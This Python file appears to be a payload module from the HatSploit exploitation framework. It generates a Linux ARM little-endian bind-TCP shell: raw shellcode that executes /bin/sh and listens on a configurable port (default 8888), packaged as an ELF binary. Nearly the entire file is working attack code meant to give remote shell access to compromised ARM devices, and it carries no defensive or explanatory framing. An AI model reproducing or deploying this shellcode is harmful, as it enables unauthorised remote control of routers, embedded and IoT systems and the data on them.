#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatvenom import HatVenom
from core.lib.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux armle Shell Bind TCP",
        'Payload': "linux/armle/shell_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Shell bind TCP payload for Linux armle.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Architecture': "armle",
        'Platform': "linux",
        'Risk': "high",
        'Type': "bind_tcp"
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        bind_port = self.parse_options(self.options)

        offsets = {
            'bport': bind_port
        }

        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x01\xe0\x8f\xe2"
            b"\x1e\xff\x2f\xe1"
            b"\x02\x20\x01\x21"
            b"\x52\x40\xc8\x27"
            b"\x51\x37\x01\xdf"
            b"\x03\x1c\x0d\xa1"
            b"\x4a\x70\x4a\x60"
            b"\x10\x22\x01\x37"
            b"\x01\xdf\x18\x1c"
            b"\x02\x21\x02\x37"
            b"\x01\xdf\x18\x1c"
            b"\x49\x40\x52\x40"
            b"\x01\x37\x01\xdf"
            b"\x03\x1c\x03\x21"
            b"\x3f\x27\x18\x1c"
            b"\x01\x39\x01\xdf"
            b"\x91\x42\xfa\xd1"
            b"\x03\xa0\xc1\x71"
            b"\x0b\x27\x01\xdf"
            b":bport:port:"
            b"\x11\x5c\x01\x01"
            b"\x01\x01\x2f\x62"
            b"\x69\x6e\x2f\x73"
            b"\x68\x58"
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'armle', shellcode, offsets)

        return payload
